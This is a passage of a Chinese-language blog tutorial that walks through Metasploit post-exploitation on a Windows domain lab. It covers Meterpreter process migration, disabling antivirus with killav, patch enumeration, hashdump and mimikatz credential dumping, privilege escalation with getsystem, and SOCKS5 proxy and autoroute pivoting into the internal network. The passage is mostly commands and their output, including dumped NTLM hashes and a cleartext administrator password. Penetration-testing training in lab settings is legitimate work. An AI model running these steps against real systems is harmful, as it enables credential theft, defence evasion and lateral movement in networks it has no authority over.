2</span><br><span class="line">[*] <span class="number">172.20</span><span class="number">.10</span><span class="number">.10</span> - Meterpreter session <span class="number">2</span> closed.</span><br></pre></td></tr></table></figure><p>抓取hash密码–需要AUTHORITY\SYSTEM权限</p><h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><p>在刚获得的Meterpreter Shell时，该shell极其脆弱和易受攻击的，所以获得此shell的<strong>第一步就是将其迁移</strong>，把它和目标机中一个稳定的进程绑定在一起，而不需要对磁盘进行任何写入操作。</p><h4 id="查看当前活跃进程"><a href="#查看当前活跃进程" class="headerlink" title="查看当前活跃进程"></a>查看当前活跃进程</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name                  Arch  Session  User                          Path</span><br><span class="line"> ---   ----  ----                  ----  -------  ----                          ----</span><br><span class="line"> <span class="number">0</span>     <span class="number">0</span>     [System Process]</span><br><span class="line"> <span class="number">4</span>     <span class="number">0</span>     System                x64   <span class="number">0</span></span><br><span class="line"> <span class="number">124</span>   <span class="number">500</span>   svchost.exe           x64   <span class="number">0</span>        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe</span><br><span class="line"> <span class="number">256</span>   <span class="number">4</span>     smss.exe              x64   <span class="number">0</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe</span><br><span class="line"> <span class="number">340</span>   <span class="number">332</span>   csrss.exe             x64   <span class="number">0</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe</span><br><span class="line"> <span class="number">392</span>   <span class="number">332</span>   wininit.exe           x64   <span class="number">0</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe</span><br><span class="line"> <span class="number">404</span>   <span class="number">384</span>   csrss.exe             x64   <span class="number">1</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe</span><br><span class="line"> <span class="number">440</span>   <span class="number">384</span>   winlogon.exe          x64   <span class="number">1</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe</span><br><span class="line"> <span class="number">500</span>   <span class="number">392</span>   services.exe          x64   <span class="number">0</span>        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe</span><br></pre></td></tr></table></figure><h4 id="获取当前进程的PID"><a href="#获取当前进程的PID" class="headerlink" title="获取当前进程的PID"></a>获取当前进程的PID</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: <span class="number">1912</span></span><br></pre></td></tr></table></figure><h4 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill &lt;pid值&gt;</span><br></pre></td></tr></table></figure><h4 id="迁移进程"><a href="#迁移进程" class="headerlink" title="迁移进程"></a>迁移进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br></pre></td></tr></table></figure><h4 id="自动迁移进程"><a href="#自动迁移进程" class="headerlink" title="自动迁移进程"></a>自动迁移进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">自动迁移进程命令：run post&#x2F;windows&#x2F;manage&#x2F;migrate</span><br></pre></td></tr></table></figure><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h4><h5 id="查看当前用户权限"><a href="#查看当前用户权限" class="headerlink" title="查看当前用户权限"></a>查看当前用户权限</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getuid # 查看权限</span><br></pre></td></tr></table></figure><h5 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WEB</span><br><span class="line">OS              : Windows <span class="number">2008</span> R2 (<span class="number">6.1</span> Build <span class="number">7601</span>, Service Pack <span class="number">1</span>).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : DE1AY</span><br><span class="line">Logged On Users : <span class="number">3</span></span><br><span class="line">Meterpreter     : x86/windows</span><br></pre></td></tr></table></figure><h5 id="获取软件安装信息"><a href="#获取软件安装信息" class="headerlink" title="获取软件安装信息"></a>获取软件安装信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_applications</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_applications</span><br><span class="line"></span><br><span class="line">[*] Enumerating applications installed on WEB</span><br><span class="line"></span><br><span class="line">Installed Applications</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line"> Name                                                                                  Version</span><br><span class="line"> ----                                                                                  -------</span><br><span class="line"> <span class="number">360</span>安全卫士                                                                               <span class="number">12.0</span><span class="number">.0</span><span class="number">.2002</span></span><br><span class="line"> <span class="number">360</span>安全卫士                                                                               <span class="number">12.0</span><span class="number">.0</span><span class="number">.2002</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB946040)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB946040)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB946308)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB946308)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB946344)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB946344)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB947540)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB947540)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB947789)       <span class="number">1</span></span><br><span class="line"> Hotfix <span class="keyword">for</span> Microsoft Visual Studio <span class="number">2007</span> Tools <span class="keyword">for</span> Applications - ENU (KB947789)       <span class="number">1</span></span><br><span class="line"> Microsoft Office <span class="number">2003</span> Web Components                                                  <span class="number">12.0</span><span class="number">.6213</span><span class="number">.1000</span></span><br><span class="line"> Microsoft Office <span class="number">2003</span> Web Components                                                  <span class="number">12.0</span><span class="number">.6213</span><span class="number">.1000</span></span><br></pre></td></tr></table></figure><h5 id="关闭杀毒软件"><a href="#关闭杀毒软件" class="headerlink" title="关闭杀毒软件"></a>关闭杀毒软件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;killav</span><br></pre></td></tr></table></figure><h5 id="判断是否是虚拟机"><a href="#判断是否是虚拟机" class="headerlink" title="判断是否是虚拟机"></a>判断是否是虚拟机</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm <span class="comment">#是否虚拟机</span></span><br><span class="line">run post/linux/gather/checkvm <span class="comment">#是否虚拟机</span></span><br><span class="line">meterpreter &gt; run post/windows/gather/checkvm</span><br></pre></td></tr></table></figure><h5 id="补丁信息情况与漏洞信息收集"><a href="#补丁信息情况与漏洞信息收集" class="headerlink" title="补丁信息情况与漏洞信息收集"></a>补丁信息情况与漏洞信息收集</h5><p>在拿到一个反弹shell后，可以用metaspolit的内置模块Local Exploit  SuggesterLocal-exploit-suggester，当我们用它来探测某一个系统时，他会告诉我们该系统有哪些exploit可能可以利用。但是由于该工具先是假设一个系统存在所有的相关漏洞，然后根据补丁信息再去排除，所以就导致误报率会高。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggester</span><br></pre></td></tr></table></figure><h5 id="查看补丁信息"><a href="#查看补丁信息" class="headerlink" title="查看补丁信息"></a>查看补丁信息</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_patches  <span class="comment">#补丁信息</span></span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_patches</span><br><span class="line"></span><br><span class="line">[*] Patch list saved to /Users/apple/.msf4/loot/<span class="number">20200906182724</span>_default_172<span class="number">.20</span><span class="number">.10</span><span class="number">.6</span>_enum_patches_447671.txt</span><br><span class="line">[*] KB2534111 applied</span><br><span class="line">[*] KB2999226 applied</span><br><span class="line">[*] KB976902 applied</span><br></pre></td></tr></table></figure><h5 id="Hash与明文密码获取"><a href="#Hash与明文密码获取" class="headerlink" title="Hash与明文密码获取"></a>Hash与明文密码获取</h5><p>获取目标机系统用户Hash</p><p>#需要SYSTEM权限</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/smart_hashdump</span><br><span class="line">[*] Running module against STU1</span><br><span class="line">[*] Hashes will be saved to the database <span class="keyword">if</span> one <span class="keyword">is</span> connected.</span><br><span class="line">[+] Hashes will be saved <span class="keyword">in</span> loot <span class="keyword">in</span> JtR password file format to:</span><br><span class="line">[*] /Users/apple/.msf4/loot/<span class="number">20200903163754</span>_default_172<span class="number">.20</span><span class="number">.10</span><span class="number">.6</span>_windows.hashes_560643.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running <span class="keyword">as</span> SYSTEM extracting hashes <span class="keyword">from</span> registry</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY fd4639f4e27c79683ae9fee56b44393f...</span><br><span class="line">[*] Obtaining the user list <span class="keyword">and</span> keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line">[*] No users <span class="keyword">with</span> password hints on this system</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[+] Administrator:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+] liukaifeng01:<span class="number">1000</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+] whoami:<span class="number">1004</span>:aad3b435b51404eeaad3b435b51404ee:e5292ea58e7e150003e00454b6bc729a:::</span><br><span class="line">[+] steady:<span class="number">1012</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">218</span>a30a4dc767f75f1456e646a5d07cd:::</span><br><span class="line">[+] steady123:<span class="number">1013</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">218</span>a30a4dc767f75f1456e646a5d07cd:::</span><br></pre></td></tr></table></figure><p>如果当前用户没有足够的权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against WEB</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] &#x2F;Users&#x2F;apple&#x2F;.msf4&#x2F;loot&#x2F;20201012180509_default_172.20.10.13_windows.hashes_113739.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[-] On this version of Windows you need to be NT AUTHORITY\SYSTEM to dump the hashes</span><br><span class="line">[-] Try setting GETSYSTEM to true.</span><br></pre></td></tr></table></figure><p>获得了本地账户的hask，获取明文密码，我们需要先载入mimikatz模块(需要免杀处理)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload mimikatz.exe 目标位置</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload &#x2F;tmp&#x2F;mimikatz.exe D:\S_JCIN\WebSite\OutWeb\L_CT\News</span><br><span class="line">[*] uploading  : &#x2F;tmp&#x2F;mimikatz.exe -&gt; D:S_JCINWebSiteOutWebL_CTNews</span><br><span class="line">[*] Uploaded 1020.76 KiB of 1020.76 KiB (100.0%): &#x2F;tmp&#x2F;mimikatz.exe -&gt; D:S_JCINWebSiteOutWebL_CTNews</span><br><span class="line">[*] uploaded   : &#x2F;tmp&#x2F;mimikatz.exe -&gt; D:S_JCINWebSiteOutWebL_CTNews</span><br></pre></td></tr></table></figure><p>mimikatz的使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">c:\\mimikatz.exe</span><br><span class="line"></span><br><span class="line">c:\&gt;mimikatz.exe</span><br><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Aug 16 2020 10:26:39</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; http://pingcastle.com / http://mysmartlogon.com   ***/</span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line">mimikatz <span class="comment"># sekurlsa::logonPasswords</span></span><br><span class="line">Authentication Id : <span class="number">0</span> ; <span class="number">2499588</span> (<span class="number">00000000</span>:<span class="number">00262404</span>)</span><br><span class="line">Session           : Interactive <span class="keyword">from</span> <span class="number">1</span></span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : GOD</span><br><span class="line">Logon Server      : OWA</span><br><span class="line">Logon Time        : <span class="number">2020</span>/<span class="number">9</span>/<span class="number">3</span> <span class="number">13</span>:<span class="number">38</span>:<span class="number">09</span></span><br><span class="line">SID               : S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-2952760202</span><span class="number">-1353902439</span><span class="number">-2381784089</span><span class="number">-500</span></span><br><span class="line">msv :</span><br><span class="line"> [<span class="number">00000003</span>] Primary</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : GOD</span><br><span class="line"> * LM       : <span class="number">3333</span>deaae325ebb705026d3fb1a43796</span><br><span class="line"> * NTLM     : <span class="number">7</span>d0e302e0cbd94d9353ac4a51d7c39c1</span><br><span class="line"> * SHA1     : d4f206f0d8303230185b2ff2fedb7d40a62effa5</span><br><span class="line">tspkg :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : GOD</span><br><span class="line"> * Password : <span class="number">1999118</span>gxaGXA.</span><br><span class="line">wdigest :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : GOD</span><br><span class="line"> * Password : <span class="number">1999118</span>gxaGXA.</span><br><span class="line">kerberos :</span><br><span class="line"> * Username : Administrator</span><br><span class="line"> * Domain   : GOD.ORG</span><br><span class="line"> * Password : <span class="number">1999118</span>gxaGXA.</span><br><span class="line">ssp :</span><br><span class="line">credman :</span><br></pre></td></tr></table></figure><p>msf自身使用mimikaz</p><p>使用 mimikatz 模块需要System权限，所以我们在使用该模块之前需要将当前MSF中的shell提升为system。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">加载kiwi模块</span><br><span class="line">load mimikatz</span><br><span class="line">查看kiwi模块的使用</span><br><span class="line">help mimikatz</span><br></pre></td></tr></table></figure><p>使用以下命令查看系统中的明文密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br></pre></td></tr></table></figure><p>kiwi模块同时支持32位和64位的系统，但是该模块默认是加载32位的系统，所以如果目标主机是64位系统的话，直接默认加载该模块会导致很多功能无法使用。所以如果目标系统是64位的，则必须先查看系统进程列表，然后将meterpreter进程迁移到一个64位程序的进程中，才能加载kiwi并且查看系统明文。如果目标系统是32位的，则没有这个限制。</p><p>hashdump</p><p>meterpreter权限不够，将其进程迁移到含有system的进程中（即使你getuid是system，但进程不在system也无法获得，亲测。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">[-] 2007: Operation failed: The parameter is incorrect.</span><br></pre></td></tr></table></figure><h5 id="提升权限"><a href="#提升权限" class="headerlink" title="提升权限"></a>提升权限</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem</span><br></pre></td></tr></table></figure><p>如果getsystem获取不到权限，基本是被UAC限制了。</p><h4 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h4><h5 id="查找域控制器"><a href="#查找域控制器" class="headerlink" title="查找域控制器"></a>查找域控制器</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/enum_domain  <span class="comment">#查找域控</span></span><br><span class="line">meterpreter &gt; run post/windows/gather/enum_domain</span><br><span class="line"></span><br><span class="line">[+] FOUND Domain: god</span><br><span class="line">[+] FOUND Domain Controller: owa (IP: <span class="number">192.168</span><span class="number">.52</span><span class="number">.138</span>)</span><br></pre></td></tr></table></figure><h5 id="ifconfig查看DNS服务器地址"><a href="#ifconfig查看DNS服务器地址" class="headerlink" title="ifconfig查看DNS服务器地址"></a>ifconfig查看DNS服务器地址</h5><h4 id="代理与端口设置"><a href="#代理与端口设置" class="headerlink" title="代理与端口设置"></a>代理与端口设置</h4><h5 id="设置sockets5代理"><a href="#设置sockets5代理" class="headerlink" title="设置sockets5代理"></a>设置sockets5代理</h5><p>搜索一下可用代理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search socks</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                     Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -  ----                                     ---------------  ----    -----  -----------</span><br><span class="line">   <span class="number">0</span>  auxiliary/scanner/http/sockso_traversal  <span class="number">2012</span><span class="number">-03</span><span class="number">-14</span>       normal  No     Sockso Music Host Server <span class="number">1.5</span> Directory Traversal</span><br><span class="line">   <span class="number">1</span>  auxiliary/server/socks4a                                  normal  No     Socks4a Proxy Server</span><br><span class="line">   <span class="number">2</span>  auxiliary/server/socks5                                   normal  No     Socks5 Proxy Server</span><br><span class="line">   <span class="number">3</span>  auxiliary/server/socks_unc                                normal  No     SOCKS Proxy UNC Path Redirection</span><br></pre></td></tr></table></figure><p>设置代理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/server/socks5</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/server/socks5):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   PASSWORD                   no        Proxy password <span class="keyword">for</span> SOCKS5 listener</span><br><span class="line">   SRVHOST   <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>          yes       The address to listen on</span><br><span class="line">   SRVPORT   <span class="number">1080</span>             yes       The port to listen on</span><br><span class="line">   USERNAME                   no        Proxy username <span class="keyword">for</span> SOCKS5 listener</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name   Description</span><br><span class="line">   ----   -----------</span><br><span class="line">   Proxy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 auxiliary(server/socks5) &gt; set SRVHOST <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">SRVHOST =&gt; 127.0.0.1</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; set SRVPORT <span class="number">5555</span></span><br><span class="line">SRVPORT =&gt; 5555</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; run</span><br><span class="line">[*] Auxiliary module running <span class="keyword">as</span> background job <span class="number">0.</span></span><br><span class="line">msf5 auxiliary(server/socks5) &gt;</span><br><span class="line">[*] Starting the socks5 proxy server</span><br></pre></td></tr></table></figure><p>然后也可以直接使用一下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set proxies socks5:127.0.0.1:8990  设置代理</span><br><span class="line">setg ReverseAllowProxy true 允许反向代理</span><br></pre></td></tr></table></figure><p>获取内网网段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">Local subnet: <span class="number">169.254</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">Local subnet: <span class="number">172.20</span><span class="number">.10</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.240</span></span><br><span class="line">Local subnet: <span class="number">192.168</span><span class="number">.52</span><span class="number">.0</span>/<span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><p>添加路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 198.168.52.0&#x2F;24</span><br></pre></td></tr></table></figure><p>查看是否添加成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -p</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   <span class="number">198.168</span><span class="number">.52</span><span class="number">.0</span>       <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>      Session <span class="number">1</span></span><br></pre></td></tr></table></figure><p>ARP扫描内网主机</p><h5 id="添加去往”内网网段”的路由"><a href="#添加去往”内网网段”的路由" class="headerlink" title="添加去往”内网网段”的路由"></a>添加去往”内网网段”的路由</h5><ul><li><p>MSF 路由添加帮助查询命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -h</span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.</span><br><span class="line">[!] Example: run post/multi/manage/autoroute OPTION=value [...]</span><br><span class="line">[*] Usage:   run autoroute [-r] -s subnet -n netmask</span><br><span class="line">[*] Examples:</span><br><span class="line">[*]   run autoroute -s <span class="number">10.1</span><span class="number">.1</span><span class="number">.0</span> -n <span class="number">255.255</span><span class="number">.255</span><span class="number">.0</span>  <span class="comment"># Add a route to 